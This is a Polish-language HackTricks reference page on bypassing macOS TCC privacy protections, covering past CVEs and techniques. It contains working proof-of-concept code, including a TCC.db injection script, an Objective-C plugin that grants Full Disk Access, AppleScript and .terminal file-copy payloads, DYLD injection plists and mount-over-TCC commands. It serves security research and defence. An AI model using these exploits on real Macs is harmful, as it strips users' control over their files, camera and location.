# TCC Bypasses w macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Według funkcjonalności

### Write Bypass

To nie jest bypass, tylko sposób działania TCC: **nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu Desktop użytkownika, nadal może zapisywać w tym miejscu**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Atrybut **extended `com.apple.macl`** jest dodawany do nowego **file**, aby zapewnić **creators app** dostęp do jego odczytu.

### TCC ClickJacking

Możliwe jest **umieszczenie okna nad monitem TCC**, aby skłonić użytkownika do **zaakceptowania** go bez jego zauważenia. PoC można znaleźć w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker może **tworzyć apps z dowolną nazwą** (np. Finder, Google Chrome...) w **`Info.plist`** i sprawić, aby zażądały dostępu do lokalizacji chronionej przez TCC. Użytkownik pomyśli, że to legitna aplikacja żąda tego dostępu.\
Co więcej, możliwe jest **usunięcie legitnej aplikacji z Docka i umieszczenie na nim fake aplikacji**, więc gdy użytkownik kliknie fake aplikację (która może używać tej samej ikony), może ona wywołać legitną aplikację, poprosić o uprawnienia TCC i wykonać malware, sprawiając, że użytkownik uwierzy, iż dostęp został zażądany przez legitną aplikację.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Więcej informacji i PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Domyślnie dostęp przez **SSH miał uprawnienie "Full Disk Access"**. Aby je wyłączyć, musi on znajdować się na liście, ale być wyłączony (usunięcie go z listy nie usunie tych uprawnień):

![TCC Request by arbitrary name - SSH Bypass: Domyślnie dostęp przez SSH miał uprawnienie "Full Disk Access". Aby je wyłączyć, musi on znajdować się na liście, ale być wyłączony (usunięcie go...](<../../../../../images/image (1077).png>)

Tutaj znajdziesz przykłady tego, jak niektóre **malwares były w stanie ominąć tę ochronę**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Zauważ, że obecnie, aby móc włączyć SSH, potrzebujesz **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atrybut **`com.apple.macl`** jest nadawany plikom, aby zapewnić **określonej aplikacji uprawnienia do ich odczytu.** Atrybut ten jest ustawiany podczas **drag\&drop** pliku na aplikację lub gdy użytkownik **klika dwukrotnie** plik, aby otworzyć go za pomocą **default application**.

Dlatego użytkownik mógłby **zarejestrować malicious app** do obsługi wszystkich rozszerzeń i wywołać Launch Services, aby **otworzyć** dowolny plik (dzięki czemu malicious file otrzyma uprawnienia do jego odczytu).

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** umożliwia komunikację z usługą XPC **`com.apple.iCloudHelper`**, która **udostępnia iCloud tokens**.

**iMovie** i **Garageband** posiadały ten entitlement oraz inne, które na to pozwalały.

Więcej **informacji** o exploicie pozwalającym **uzyskać icloud tokens** dzięki temu entitlementowi znajdziesz w prezentacji: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Aplikacja z uprawnieniem **`kTCCServiceAppleEvents`** będzie mogła **kontrolować inne Apps**. Oznacza to, że będzie mogła **nadużywać uprawnień przyznanych innym Apps**.

Więcej informacji o Apple Scripts znajdziesz tutaj:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na przykład, jeśli App ma **Automation permission nad `iTerm`**, jak w tym przykładzie, **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, który nie ma FDA, może wywołać iTerm, który je posiada, i użyć go do wykonania działań:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Przez Finder

Lub jeśli aplikacja ma dostęp przez Finder, może użyć skryptu takiego jak ten:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Według zachowania aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Działający w przestrzeni użytkownika **tccd daemon** używał zmiennej **`HOME`** **env** do uzyskiwania dostępu do bazy danych użytkowników TCC pod adresem: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym postem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), ponieważ daemon TCC działa za pośrednictwem `launchd` w domenie bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.\
W ten sposób **attacker mógł ustawić zmienną środowiskową `$HOME`** w **`launchctl`**, aby wskazywała na **kontrolowany** **katalog**, zrestartować daemon **TCC**, a następnie **bezpośrednio zmodyfikować bazę danych TCC**, przyznając sobie **każde dostępne uprawnienie TCC** bez wyświetlania monitu użytkownikowi końcowemu.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes miało dostęp do lokalizacji chronionych przez TCC, ale podczas tworzenia notatki jest ona **tworzona w niezabezpieczonej lokalizacji**. Można więc było poprosić Notes o skopiowanie chronionego pliku do notatki (czyli do niezabezpieczonej lokalizacji), a następnie uzyskać dostęp do tego pliku:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` wraz z biblioteką `libsecurity_translocate` posiadał entitlement `com.apple.private.nullfs_allow`, który pozwalał na tworzenie mountów **nullfs**, a także entitlement `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`**, umożliwiający dostęp do każdego pliku.

Możliwe było dodanie atrybutu quarantine do „Library”, wywołanie usługi XPC **`com.apple.security.translocation`**, po czym Library było mapowane do **`$TMPDIR/AppTranslocation/d/d/Library`**, gdzie można było **uzyskać dostęp** do wszystkich dokumentów znajdujących się w Library.

### CVE-2024-44131 - FileProvider symlink race

Aplikacje, które przekazują operacje na plikach **uprzywilejowanemu helperowi** (tutaj **`fileproviderd`** / **`Files.app`**), kopiują lub przenoszą elementy **w imieniu użytkownika**, więc kopiowanie jest wykonywane z uprawnieniami helpera, a nie wywołującego.

Jamf Threat Labs pokazało, że walidację symlinków wykonywaną przed operacją można **wyścignąć**: zamiast umieszczać symlink w **ostatnim** komponencie ścieżki (który jest sprawdzany), attacker podmienia **pośredni** katalog ścieżki **po rozpoczęciu kopiowania**. Uprzywilejowany helper podąża następnie za kontrolowanym przez attackera linkiem i odczytuje/zapisuje lokalizacje chronione przez TCC **bez wyświetlania promptu**.

Katalogi, które **nie są chronione** przez losowy UUID w swojej ścieżce (na przykład `~/Library/Mobile Documents/com~apple~CloudDocs`), są najłatwiejszymi celami, ponieważ attacker może przewidzieć pełną ścieżkę potrzebną do przeprowadzenia race.

> [!TIP]
> To ogólny wzorzec, którego należy szukać: **każdy uprzywilejowany proces, który rozwiązuje ścieżkę więcej niż raz** (check-then-use albo `rename()`/`copyfile()` rozpatrujące źródło i cel osobno) może zostać wyścignięty przez podmianę katalogu znajdującego się w środku ścieżki. Tylko `O_NOFOLLOW_ANY`, `openat()` na już otwartym katalogu FD albo `realpath()` + ponowna walidacja rzeczywiście zamykają to okno.

Więcej informacji znajduje się w [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` może zostać zbudowana z `SQLITE_ENABLE_SQLLOG`, które dodaje hook logowania sterowany przez zmienne środowiskowe ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – dla **każdej otwartej bazy danych** w `path` (katalog musi już istnieć) zapisywana jest **kopia pliku bazy danych** oraz log instrukcji SQL.
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – twórz **świeżą kopię za każdym razem**, gdy DB jest otwierana/podłączana, zamiast ponownie używać istniejącej.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguj połączenie tylko wtedy, gdy obok głównej DB istnieje plik `<database>-sqllog`.

Jeśli uda się wstrzyknąć tę zmienną do procesu, który ma **FDA** i otwiera bazy SQLite, proces bez problemu **skopiuje te chronione bazy danych** do kontrolowanego przez attackera katalogu. Ponieważ nazwa pliku docelowego jest wyprowadzana z danych kontrolowanych przez attackera, symlink umieszczony w miejscu docelowym zmienia tę samą primitive w **zapis dowolnego pliku** z uprawnieniami procesu docelowego.

### **SQLITE_AUTO_TRACE**

Jeśli zmienna środowiskowa **`SQLITE_AUTO_TRACE`** jest ustawiona, biblioteka **`libsqlite3.dylib`** rozpocznie **logowanie** wszystkich zapytań SQL. Wiele aplikacji korzystało z tej biblioteki, więc możliwe było logowanie wszystkich ich zapytań SQLite.

Kilka aplikacji Apple korzystało z tej biblioteki, aby uzyskiwać dostęp do informacji chronionych przez TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

Dwa poprzednie wpisy są przykładami tej samej ogólnej techniki i warto poszukać kolejnych: **frameworks ładowane do aplikacji uprzywilejowanych względem TCC często udostępniają zmienne środowiskowe debug/logging, które powodują, że proces tworzy plik w ścieżce kontrolowanej przez wywołującego**.

Workflow wyszukiwania:

1. Wybierz cel z FDA lub innym cennym uprawnieniem TCC (`Music`, `TV`, `Terminal`, agenci MDM...) i wyświetl frameworks, z którymi jest linkowany (`otool -L`, `vmmap`).
2. Przeszukaj te frameworks pod kątem stringów `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ustaw zmienne kandydujące za pomocą `launchctl setenv NAME /path/you/control`, uruchom aplikację i obserwuj jej działania w systemie plików za pomocą `fs_usage -w -f filesys <pid>` lub `sudo fs_usage | grep <path>`.
4. Jeśli proces **tworzy lub zmienia nazwę** pliku w twoim katalogu, masz write primitive: wskaż jako miejsce docelowe symlink (lub wykonaj race na katalogu pośrednim, jak w opisanym wyżej CVE-2024-44131), aby przekierować zapis do `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Ograniczają to dwie kwestie. Po pierwsze, zmienne `DYLD_*` są ignorowane w przypadku plików binarnych z hardened runtime, chyba że aplikacja zawiera entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — zobacz także [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Po drugie, Apple usuwa poszczególne zmienne debug frameworków, gdy zostaną zgłoszone, więc zmienna działająca w jednej wersji macOS często znika w następnej. Jeśli aplikacja po jej ustawieniu odmawia cichego uruchomienia, uznaj tę zmienną za już odfiltrowaną.

Zobacz [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md), aby poznać równoważną technikę wykorzystującą zmienne linkera.

### Apple Remote Desktop

Jako root możesz włączyć tę usługę, a **agent ARD uzyska pełny dostęp do dysku**, co następnie może zostać wykorzystane przez użytkownika do skopiowania nowej **bazy danych użytkownika TCC**.

## By **NFSHomeDirectory**

TCC używa bazy danych w folderze HOME użytkownika do kontrolowania dostępu do zasobów określonych dla użytkownika w **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Dlatego jeśli użytkownik zdoła zrestartować TCC ze zmienną środowiskową $HOME wskazującą na **inny folder**, może utworzyć nową bazę danych TCC w **/Library/Application Support/com.apple.TCC/TCC.db** i nakłonić TCC do przyznania dowolnej aplikacji dowolnego uprawnienia TCC.

> [!TIP]
> Zwróć uwagę, że Apple używa ustawienia zapisanego w profilu użytkownika, w atrybucie **`NFSHomeDirectory`**, jako **wartości `$HOME`**, więc jeśli przejmiesz aplikację z uprawnieniami do modyfikowania tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **weaponize** tę opcję za pomocą TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) do modyfikacji folderu **HOME** użytkownika.

1. Uzyskaj blob _csreq_ dla docelowej aplikacji.
2. Umieść spreparowany plik _TCC.db_ z wymaganym dostępem i blobem _csreq_.
3. Wyeksportuj wpis użytkownika z Directory Services za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis Directory Services, aby zmienić katalog domowy użytkownika.
5. Zaimportuj zmodyfikowany wpis Directory Services za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i zrestartuj proces.

Drugi POC wykorzystywał **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Możliwe było uruchomienie **`configd`** z opcją **`-t`**, za pomocą której attacker mógł wskazać **custom Bundle do załadowania**. Dlatego exploit **zastępuje** metodę **`dsexport`** i **`dsimport`** zmiany katalogu domowego użytkownika przez **code injection do `configd`**.

Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Istnieją różne techniki injectowania kodu do procesu i wykorzystywania jego uprawnień TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ponadto najczęściej spotykanym process injection wykorzystywanym do bypass TCC jest użycie **plugins (load library)**.\
Plugins to dodatkowy kod, zwykle w postaci libraries lub plist, który jest **ładowany przez główną aplikację** i wykonywany w jej kontekście. Dlatego jeśli główna aplikacja miała dostęp do plików ograniczonych przez TCC (za pośrednictwem przyznanych uprawnień lub entitlements), **custom code również będzie go mieć**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała plugins z rozszerzeniem **`.daplug`** i **nie miała hardened** runtime.

Aby weaponize to CVE, **`NFSHomeDirectory`** jest **zmieniany** (przez wykorzystanie poprzedniego entitlementu), aby umożliwić **przejęcie bazy danych TCC użytkownika** i ominięcie TCC.

Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** miał entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Pierwszy **zezwalał na code injection**, a drugi zapewniał mu dostęp do **zarządzania TCC**.

Ten binary umożliwiał ładowanie **third party plug-ins** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego możliwe było **załadowanie pluginu i wykorzystanie uprawnień TCC** za pomocą tego PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Aplikacje systemowe, które otwierają strumień z kamery za pośrednictwem Core Media I/O (aplikacje z **`kTCCServiceCamera`**), ładują **w procesie te pluginy** znajdujące się w `/Library/CoreMediaIO/Plug-Ins/DAL` (nie są chronione przez SIP).

Samo umieszczenie w tym katalogu biblioteki ze standardowym **constructorem** wystarczy, aby **wstrzyknąć kod**.

Kilka aplikacji Apple było podatnych na ten problem.

### Firefox

Aplikacja Firefox posiadała entitlements `com.apple.security.cs.disable-library-validation` oraz `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Więcej informacji o tym, jak łatwo to wykorzystać, znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarny plik `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` posiadał entitlements **`com.apple.private.tcc.allow`** oraz **`com.apple.security.get-task-allow`**, co umożliwiało wstrzyknięcie code do procesu i wykorzystanie uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram posiadał entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** oraz **`com.apple.security.cs.disable-library-validation`**, więc można było go wykorzystać do **uzyskania dostępu do jego uprawnień**, na przykład do nagrywania za pomocą kamery. [**Payload znajdziesz w writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Zwróć uwagę, że aby użyć zmiennej środowiskowej do załadowania library, utworzono **custom plist** w celu wstrzyknięcia tej library, a następnie użyto **`launchctl`** do jej uruchomienia:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Przez otwarte invocations

Możliwe jest wywołanie **`open`** nawet w sandboxie

### Skrypty Terminala

Dość często nadaje się Terminalowi **Full Disk Access (FDA)**, przynajmniej na komputerach używanych przez osoby techniczne. Możliwe jest również wywoływanie za jego pomocą skryptów **`.terminal`**.

Skrypty **`.terminal`** to pliki plist, takie jak ten, z poleceniem do wykonania w kluczu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacja mogłaby zapisać skrypt terminala w lokalizacji takiej jak /tmp i uruchomić go za pomocą polecenia takiego jak:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Przez montowanie

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Każdy użytkownik** (nawet bez uprawnień) może utworzyć i zamontować snapshot Time Machine oraz uzyskać **dostęp do WSZYSTKICH plików** tego snapshotu.\
**Jedyne wymagane uprawnienie** dotyczy używanej aplikacji (takiej jak `Terminal`), która musi mieć dostęp **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`); dostęp ten musi zostać przyznany przez administratora.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Bardziej szczegółowe wyjaśnienie można znaleźć w [**oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Nawet jeśli plik TCC DB był chroniony, możliwe było **zamontowanie nowego pliku TCC.db w miejsce katalogu**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Sprawdź **pełny exploit** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Jak wyjaśniono w [oryginalnym opisie](https://www.kandji.io/blog/macos-audit-story-part2), ten CVE wykorzystywał `diskarbitrationd`.

Funkcja `DADiskMountWithArgumentsCommon` z public frameworka `DiskArbitration` wykonywała kontrole bezpieczeństwa. Można je było jednak ominąć, wywołując bezpośrednio `diskarbitrationd`, a następnie używając elementów `../` w ścieżce i symlinków.

Pozwalało to atakującemu wykonywać dowolne mounty w dowolnej lokalizacji, w tym montować systemy plików na bazie danych TCC, dzięki entitlementowi `com.apple.private.security.storage-exempt.heritable` należącemu do `diskarbitrationd`.

### asr

Narzędzie **`/usr/sbin/asr`** umożliwiało skopiowanie całego dysku i zamontowanie go w innym miejscu z pominięciem zabezpieczeń TCC.

### Location Services

Istnieje trzecia baza danych TCC w **`/var/db/locationd/clients.plist`**, która wskazuje klientów uprawnionych do **uzyskiwania dostępu do Location Services**.\
Folder **`/var/db/locationd/` nie był chroniony przed montowaniem DMG**, dlatego możliwe było zamontowanie własnego pliku plist.

## Za pomocą aplikacji uruchamianych podczas startu


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Za pomocą grep

W wielu przypadkach pliki przechowują poufne informacje, takie jak adresy e-mail, numery telefonów, wiadomości... w niezabezpieczonych lokalizacjach (co Apple uznaje za vulnerability).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

To już nie działa, ale [**w przeszłości działało**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Inny sposób, wykorzystujący [**zdarzenia CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Materiały referencyjne

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**Ponad 20 sposobów na ominięcie mechanizmów prywatności macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (zmienne środowiskowe SQLITE_ENABLE_SQLLOG)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - entitlement Allow DYLD environment variables**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
